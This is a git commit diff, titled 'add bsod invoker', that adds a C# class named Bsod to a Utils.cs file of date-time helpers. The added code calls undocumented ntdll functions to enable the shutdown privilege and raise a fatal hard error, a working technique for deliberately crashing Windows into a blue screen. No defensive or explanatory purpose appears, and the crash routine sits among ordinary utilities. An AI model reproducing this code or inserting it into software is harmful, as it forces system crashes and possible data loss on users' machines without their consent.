1d2473d6bcbeb8299a0ac06952fd5c5ec19a38a2
Joe Ford <focus@ford-rt.com>
2019-02-03 10:53:51 +0300

    add bsod invoker

--- Utils.cs
+++ Utils.cs
@@ -6,6 +6,23 @@ using System.Runtime.InteropServices;
 
 namespace Utils
 {
+    class Bsod
+    {
+        [DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        [DllImport("ntdll.dll")]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+        public static unsafe void Invoke()
+        {
+            Boolean t1;
+            uint t2;
+            RtlAdjustPrivilege(19, true, false, out t1);
+            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+        }
+    }
+
     public class DateTimeUtils
     {
         public class SetSystemDateTime
